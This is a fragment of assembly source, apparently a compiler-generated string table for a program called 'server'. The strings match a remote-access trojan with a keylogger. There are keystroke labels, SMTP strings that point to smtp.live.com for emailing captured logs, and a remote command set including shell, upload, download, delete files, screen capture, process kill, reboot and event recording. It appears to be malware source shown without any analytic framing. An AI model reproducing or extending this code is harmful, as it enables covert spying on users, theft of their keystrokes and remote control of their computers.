db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0256.server:
db	"[NUMPAD 3]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0258.server:
db	"[NUMPAD 4]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.025A.server:
db	"[NUMPAD 5]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.025C.server:
db	"[NUMPAD 6]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.025E.server:
db	"[NUMPAD 7]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0260.server:
db	"[NUMPAD 8]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0262.server:
db	"[NUMPAD 9]"
db	6 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.0264.server:
db	"[*]"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.0266.server:
db	"[+]"
db	5 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.0268.server:
db	"[SEPARATOR]"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.026A.server:
db	"[-]"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.026C.server:
db	"[.]"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.026E.server:
db	"[/]"
db	5 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0270.server:
db	"[F1]"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0272.server:
db	"[F2]"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0274.server:
db	"[F3]"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0276.server:
db	"[F4]"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0278.server:
db	"[F5]"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.027A.server:
db	"[F6]"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.027C.server:
db	"[F7]"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.027E.server:
db	"[F8]"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0280.server:
db	"[F9]"
db	4 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0282.server:
db	"[F10]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0284.server:
db	"[F11]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0286.server:
db	"[F12]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0288.server:
db	"[F13]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.028A.server:
db	"[F14]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.028C.server:
db	"[F15]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.028E.server:
db	"[F16]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0290.server:
db	"[F17]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0292.server:
db	"[F18]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0294.server:
db	"[F19]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0296.server:
db	"[F20]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0298.server:
db	"[F21]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.029A.server:
db	"[F22]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.029C.server:
db	"[F23]"
db	3 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.029E.server:
db	"[F24]"
db	3 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.029F.server:
db	"[NUMLOCK]"
db	7 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.02A0.server:
db	"[SCROLL]"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.02A1.server:
db	"[L SHIFT"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.02A2.server:
db	"[R SHIFT"
db	8 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.02A3.server:
db	"[L CONTROL"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.02A4.server:
db	"[R CONTROL"
db	6 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.02A5.server:
db	"[L ALT"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.02A6.server:
db	"[R ALT"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.02A8.server:
db	"[ATTN]"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.02AA.server:
db	"[CRSEL]"
db	1 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.02AC.server:
db	"[EXSEL]"
db	1 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.02AE.server:
db	"[EREOF]"
db	1 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.02B0.server:
db	"[PLAY]"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.02B2.server:
db	"[ZOOM]"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.02B4.server:
db	"[NONAME]"
db	8 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.02B6.server:
db	"[PA1]"
db	3 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.02B8.server:
db	"[OEM_CLEAR]"
db	5 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.02B9.server:
db	"[L WIN"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.02BA.server:
db	"[R WIN"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.02BB.server:
db	"[CONTEXT"
db	8 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02BD.server:
db	";"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02BF.server:
db	"="
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02C1.server:
db	","
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02C3.server:
db	"-"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02C5.server:
db	"."
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02C7.server:
db	"/"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02C9.server:
db	"'"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02CB.server:
db	"["
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02CD.server:
db	0x5C
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02CF.server:
db	"]"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02D1.server:
db	"#"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02D3.server:
db	"`"
db	7 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.02D5.server:
db	" DOWN]"
db	2 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.02D6.server:
db	" UP]"
db	4 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.02D9.server:
db	"notitle"
db	1 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.02DB.server:
db	0x01,0x02,0x01,0x02,"->["
db	1 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.02DC.server:
db	"]",0x01,0x02
db	5 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.02DE.server:
db	"[SPACE]"
db	1 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.02DF.server:
db	"_event KEY "
db	5 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.02E9.server:
db	"smtp.live.com"
db	3 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.02F5.server:
db	0x0D,0x0A,0x0D,0x0A
db	4 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.02F6.server:
db	"  "
db	6 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.02F8.server:
db	"06-09-10 GMT"
db	4 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.02FE.server:
db	"HELO "
db	3 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.02FF.server:
db	"MAIL FROM: <"
db	4 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0300.server:
db	">"
db	7 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0301.server:
db	"RCPT TO: <"
db	6 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0302.server:
db	"DATA"
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0304.server:
db	"Date: "
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0305.server:
db	0x0D,0x0A,"To: <"
db	1 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0306.server:
db	">",0x0D,0x0A,"From: "
db	7 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0307.server:
db	0x0D,0x0A,"Sender: "
db	6 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.0308.server:
db	0x0D,0x0A,"Reply-To: <"
db	3 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0309.server:
db	">",0x0D,0x0A,"Subject: "
db	4 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.030A.server:
db	0x0D,0x0A
db	6 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.030B.server:
db	0x0D,0x0A,"."
db	5 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.030C.server:
db	"QUIT"
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0312.server:
db	0x0D,0x0A,"try "
db	2 dup 0
;
dd 48, 0, 26, 0x80130001
@_string.0313.server:
db	":connecting to mailserver "
db	6 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.0315.server:
db	0x0D,0x0A,"connected",0x0D,0x0A
db	3 dup 0
;
dd 40, 0, 21, 0x80130001
@_string.0319.server:
db	0x0D,0x0A,"connection failed",0x0D,0x0A
db	3 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.031F.server:
db	"DISCONNECT"
db	6 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0321.server:
db	"Start Server"
db	4 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.0351.server:
db	"10."
db	5 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0353.server:
db	"starting up",0x00
db	4 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.035A.server:
db	"SLV"
db	5 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.03AB.server:
db	"AUTH"
db	4 dup 0
;
dd 48, 0, 25, 0x80130001
@_string.03AE.server:
db	"AUTHOK",0x0D,0x0A,"CMSG *** Welcome "
db	7 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.03B0.server:
db	" ***"
db	4 dup 0
;
dd 56, 0, 33, 0x80130001
@_string.03B1.server:
db	"CMSG *** AUTH FAILED ***",0x0D,0x0A,"CMSG --"
db	7 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.03B2.server:
db	"--"
db	6 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.03B3.server:
db	"refresh"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03B4.server:
db	"fileinfo"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03B5.server:
db	"movefile"
db	8 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.03B6.server:
db	"delallfiles"
db	5 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03B7.server:
db	"deldir"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.03B8.server:
db	"delfile"
db	1 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03B9.server:
db	"newdir"
db	2 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.03BA.server:
db	"getdrives"
db	7 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.03BB.server:
db	"DRIVES "
db	1 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.03BC.server:
db	"treeb"
db	3 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.03BD.server:
db	"DIR"
db	5 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03BE.server:
db	"getenv"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03BF.server:
db	"_event"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03C1.server:
db	"upload"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03C2.server:
db	"download"
db	8 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03C3.server:
db	"listen"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.03C4.server:
db	"sysmenu"
db	1 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.03C5.server:
db	"mailreply"
db	7 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.03C6.server:
db	"estop"
db	3 dup 0
;
dd 56, 0, 36, 0x80130001
@_string.03C7.server:
db	"CMSG *** Event recording stopped ***"
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03C8.server:
db	"estart"
db	2 dup 0
;
dd 56, 0, 36, 0x80130001
@_string.03C9.server:
db	"CMSG *** Event recording started ***"
db	4 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03CA.server:
db	"resetscr"
db	8 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.03CF.server:
db	"CMSG *** RESET ***"
db	6 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.03D0.server:
db	"email"
db	3 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03D1.server:
db	"strevent"
db	8 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.03D2.server:
db	"getslog"
db	1 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.03D3.server:
db	"getelog"
db	1 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03D4.server:
db	"logoff"
db	2 dup 0
;
dd 48, 0, 24, 0x80130001
@_string.03D5.server:
db	"CMSG *** logging off ***"
db	8 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03D8.server:
db	"reboot"
db	2 dup 0
;
dd 40, 0, 22, 0x80130001
@_string.03D9.server:
db	"CMSG *** rebooting ***"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03DB.server:
db	"poweroff"
db	8 dup 0
;
dd 48, 0, 25, 0x80130001
@_string.03DC.server:
db	"CMSG *** powering off ***"
db	7 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03DE.server:
db	"status"
db	2 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.03DF.server:
db	"popup"
db	3 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03E0.server:
db	"proclist"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03E1.server:
db	"prockill"
db	8 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03E2.server:
db	"capscr"
db	2 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.03E6.server:
db	"shell"
db	3 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.03E7.server:
db	"pong"
db	4 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.03E8.server:
db	"wan"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.03E9.server:
db	"lan"
db	5 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03EA.server:
db	"shutdown"
db	8 dup 0
;
dd 48, 0, 26, 0x80130001
@_string.03EB.server:
db	"CMSG *** SHUTTING DOWN ***"
db	6 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.03EC.server:
db	"auth"
db	4 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.03ED.server:
db	"CMSG invalid: "
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.03F0.server:
db	"REFRESH"
db	1 dup 0
;
dd 48, 0, 27, 0x80130001
@_string.03FA.server:
db	"CMSG --- properties error: "
db	5 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03FB.server:
db	0x01,0x02,"--- "
db	2 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.03FE.server:
db	"123 "
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0408.server:
db	"FINFO "
db	2 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0409.server:
db	"|"
db	7 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0414.server:
db	"folder"
db	2 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0415.server:
db	"file"
db	4 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0416.server:
db	"CMSG --- "
db	7 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0417.server:
db	" renamed: "
db	6 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0418.server:
db	"DIR "
db	4 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.0419.server:
db	"CMSG --- cannot rename "
db	1 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.041A.server:
db	": "
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0422.server:
db	0x00,0x00
db	6 dup 0
;
dd 48, 0, 29, 0x80130001
@_string.042E.server:
db	"CMSG --- files deleted from: "
db	3 dup 0
;
dd 48, 0, 31, 0x80130001
@_string.042F.server:
db	"CMSG --- cannot deleted files: "
db	1 dup 0
;
dd 48, 0, 25, 0x80130001
@_string.0435.server:
db	"CMSG --- folder deleted: "
db	7 dup 0
;
dd 48, 0, 31, 0x80130001
@_string.0436.server:
db	"CMSG --- cannot delete folder: "
db	1 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.043D.server:
db	"CMSG --- file deleted: "
db	1 dup 0
;
dd 48, 0, 29, 0x80130001
@_string.043E.server:
db	"CMSG --- cannot delete file: "
db	3 dup 0
;
dd 56, 0, 39, 0x80130001
@_string.0445.server:
db	"CMSG --- directory too long (max 248): "
db	1 dup 0
;
dd 56, 0, 34, 0x80130001
@_string.0446.server:
db	"CMSG --- cannot create directory: "
db	6 dup 0
;
dd 80, 0, 61, 0x80130001
@_string.044D.server:
db	"CMSG --- can not acquire tree, previous operation in progress"
db	3 dup 0
;
dd 48, 0, 29, 0x80130001
@_string.044E.server:
db	"CMSG * can not acquire tree: "
db	3 dup 0
;
dd 56, 0, 34, 0x80130001
@_string.0451.server:
db	"CMSG ",0x01,0x02,"--- environment strings ---"
db	6 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0452.server:
db	"CMSG "
db	3 dup 0
;
dd 56, 0, 36, 0x80130001
@_string.0453.server:
db	"CMSG --- environment strings end ---"
db	4 dup 0
;
dd 48, 0, 30, 0x80130001
@_string.046D.server:
db	"CMSG *** server listen timeout"
db	2 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.046F.server:
db	"CMSG *** newP2P() fault"
db	1 dup 0
;
dd 64, 0, 44, 0x80130001
@_string.0471.server:
db	"CMSG *** can not bind remote socket to port "
db	4 dup 0
;
dd 64, 0, 43, 0x80130001
@_string.0488.server:
db	"CMSG *** mail not sent, no data to send ***"
db	5 dup 0
;
dd 40, 0, 22, 0x80130001
@_string.048B.server:
db	"CMSG *** mail sent ***"
db	2 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.048F.server:
db	"on"
db	6 dup 0
;
dd 56, 0, 35, 0x80130001
@_string.0490.server:
db	"CMSG ",0x01,0x02,"*** systray menu enabled ***"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.0491.server:
db	"off"
db	5 dup 0
;
dd 56, 0, 36, 0x80130001
@_string.0492.server:
db	"CMSG ",0x01,0x02,"*** systray menu disabled ***"
db	4 dup 0
;
dd 56, 0, 38, 0x80130001
@_string.0496.server:
db	"CMSG ",0x01,0x02,"*** event streaming enabled ***"
db	2 dup 0
;
dd 56, 0, 39, 0x80130001
@_string.0498.server:
db	"CMSG ",0x01,0x02,"*** event streaming disabled ***"
db	1 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.04A2.server:
db	"EVENTLOGPART "
db	3 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.04A7.server:
db	"EVENTFILE "
db	6 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.04B0.server:
db	"KEYLOG "
db	1 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.04BE.server:
db	"enabled"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.04BF.server:
db	"disabled"
db	8 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.04C3.server:
db	" status ---"
db	5 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.04C4.server:
db	"CMSG :server location",0x09,0x09
db	1 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.04C5.server:
db	"CMSG :user name",0x09,0x09
db	7 dup 0
;
dd 40, 0, 21, 0x80130001
@_string.04C6.server:
db	"CMSG :computer name",0x09,0x09
db	3 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.04C7.server:
db	"CMSG :start time",0x09,0x09
db	6 dup 0
;
dd 40, 0, 20, 0x80130001
@_string.04CA.server:
db	"CMSG :current time",0x09,0x09
db	4 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.04CB.server:
db	"CMSG :uptime",0x09,0x09,0x09
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.04CC.server:
db	" minutes"
db	8 dup 0
;
dd 40, 0, 22, 0x80130001
@_string.04CD.server:
db	"CMSG :logical drives",0x09,0x09
db	2 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.04CE.server:
db	"CMSG :windows dir",0x09,0x09
db	5 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.04CF.server:
db	"CMSG :system dir",0x09,0x09
db	6 dup 0
;
dd 40, 0, 21, 0x80130001
@_string.04D0.server:
db	"CMSG :window focus",0x09,0x09,"["
db	3 dup 0
;
dd 40, 0, 20, 0x80130001
@_string.04D1.server:
db	"CMSG :systray menu",0x09,0x09
db	4 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.04D2.server:
db	"CMSG :event streaming",0x09,0x09
db	1 dup 0
;
dd 40, 0, 22, 0x80130001
@_string.04D3.server:
db	"CMSG :event log size",0x09,0x09
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.04D4.server:
db	" bytes"
db	2 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.04D5.server:
db	"CMSG :server log size",0x09,0x09
db	1 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.04D6.server:
db	"CMSG :data recv",0x09,0x09
db	7 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.04D7.server:
db	"CMSG :data sent",0x09,0x09
db	7 dup 0
;
dd 40, 0, 23, 0x80130001
@_string.04D8.server:
db	"CMSG --- status end ---"
db	1 dup 0
;
dd 48, 0, 28, 0x80130001
@_string.04DD.server:
db	"CMSG *** popup displayed ***"
db	4 dup 0
;
dd 48, 0, 26, 0x80130001
@_string.04DE.server:
db	"CMSG *** popup clicked ***"
db	6 dup 0
;
dd 48, 0, 24, 0x80130001
@_string.04EC.server:
db	"CMSG * process created: "
db	8 dup 0
;
dd 56, 0, 35, 0x80130001
@_string.04EE.server:
db	"CMSG *** unable to create process: "
db	5 dup 0
;
dd 48, 0, 31, 0x80130001
@_string.04F1.server:
db	"CMSG *** invalid process id ***"
db	1 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0501.server:
db	"KERNEL32.DLL"
db	4 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.0502.server:
db	"ExitProcess"
db	5 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.0504.server:
db	"CMSG *** process "
db	7 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.0505.server:
db	" killed ***"
db	5 dup 0
;
dd 40, 0, 22, 0x80130001
@_string.0507.server:
db	" forcefully killed ***"
db	2 dup 0
;
dd 48, 0, 30, 0x80130001
@_string.0508.server:
db	"CMSG *** process not found ***"
db	2 dup 0
;
dd 48, 0, 25, 0x80130001
@_string.050A.server:
db	"CMSG --- process list ---"
db	7 dup 0
;
dd 48, 0, 29, 0x80130001
@_string.050B.server:
db	"CMSG --- process list end ---"
db	3 dup 0
;
dd 40, 0, 22, 0x80130001
@_string.0511.server:
db	"CMSG *** cap timeout: "
db	2 dup 0
;
dd 56, 0, 32, 0x80130001
@_string.0512.server:
db	"CMSG *** unable to acquire cap: "
db	8 dup 0
;
dd 56, 0, 36, 0x80130001
@_string.0514.server:
db	"CMSG *** cap ijlib15.dll not found: "
db	4 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0521.server:
db	"ijl15.dll"
db	7 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0522.server:
db	"ijlInit"
db	1 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0523.server:
db	"ijlFree"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0524.server:
db	"ijlWrite"
db	8 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.053E.server:
db	"DISPLAY"
db	1 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.05B0.server:
db	"rb"
db	6 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.062E.server:
db	"0"
db	7 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0635.server:
db	" files  "
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0636.server:
db	" folders"
db	8 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0644.server:
db	"*"
db	7 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0647.server:
db	".."
db	6 dup 0
;
dd 64, 0, 42, 0x80130001
@_string.15D6.server:
db	"Microsoft Base Cryptographic Provider v1.0"
db	6 dup 0
;
dd 64, 0, 46, 0x80130001
@_string.15DA.server:
db	"Microsoft Enhanced Cryptographic Provider v1.0"
db	2 dup 0
;
dd 64, 0, 46, 0x80130001
@_string.15DE.server:
db	"Microsoft RSA Signature Cryptographic Provider"
db	2 dup 0
;
dd 64, 0, 45, 0x80130001
@_string.15E2.server:
db	"Microsoft RSA SChannel Cryptographic Provider"
db	3 dup 0
;
dd 64, 0, 41, 0x80130001
@_string.15E6.server:
db	"Microsoft Base DSS Cryptographic Provider"
db	7 dup 0
;
dd 80, 0, 60, 0x80130001
@_string.15EA.server:
db	"Microsoft Base DSS and Diffie-Hellman Cryptographic Provider"
db	4 dup 0
;
dd 88, 0, 64, 0x80130001
@_string.15EE.server:
db	"Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider"
db	8 dup 0
;
dd 64, 0, 44, 0x80130001
@_string.15F2.server:
db	"Microsoft DH SChannel Cryptographic Provider"
db	4 dup 0
;
dd 64, 0, 41, 0x80130001
@_string.15F6.server:
db	"Microsoft Base Smart Card Crypto Provider"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.1672.server:
db	"O"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.1674.server:
db	"G"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.1676.server:
db	"D"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.1678.server:
db	"S"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.167A.server:
db	"P"
db	7 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.167C.server:
db	"AR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.167E.server:
db	"AI"
db	6 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.1680.server:
db	"A"
db	7 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1683.server:
db	"OA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1685.server:
db	"OD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1687.server:
db	"AU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1689.server:
db	"AL"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.168B.server:
db	"OU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.168D.server:
db	"OL"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.168F.server:
db	"CI"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1691.server:
db	"OI"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1693.server:
db	"NP"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1695.server:
db	"IO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1697.server:
db	"ID"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.1699.server:
db	"SA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.169B.server:
db	"FA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.169D.server:
db	"RP"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.169F.server:
db	"WP"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16A1.server:
db	"CC"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16A3.server:
db	"DC"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16A5.server:
db	"LC"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16A7.server:
db	"SW"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16A9.server:
db	"LO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16AB.server:
db	"DT"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16AD.server:
db	"CR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16AF.server:
db	"RC"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16B1.server:
db	"WD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16B3.server:
db	"WO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16B5.server:
db	"SD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16B7.server:
db	"GA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.16B9.server:
db	"GR"
